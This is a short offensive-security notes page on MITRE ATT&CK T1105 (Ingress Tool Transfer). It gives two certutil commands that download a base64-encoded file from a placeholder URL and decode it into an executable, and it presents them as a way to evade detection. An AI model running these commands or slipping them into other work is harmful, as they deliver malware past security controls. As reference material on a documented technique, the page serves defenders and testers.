---
description: 'MITRE ATT&CK®: T1105: Ingress Tool Transfer'
---

# File Transfer

This technique will bypass detection from the system security by encoding the content in the file in base64.

```
certutil -urlcache -split “http://B64MALICIOUSFILE.txt” B64maliciousfile.txt
```

Certutil can now be used to decode the malicious file locally.

```
certutil -decode B64MaliciousFile.txt B64MalciousFile.exe
```















### References:

{% embed url="https://lolbas-project.github.io/lolbas/Binaries/Certutil/" %}

{% embed url="https://www.securityhq.com/blog/security-101-lolbins-malware-exploitation/" %}
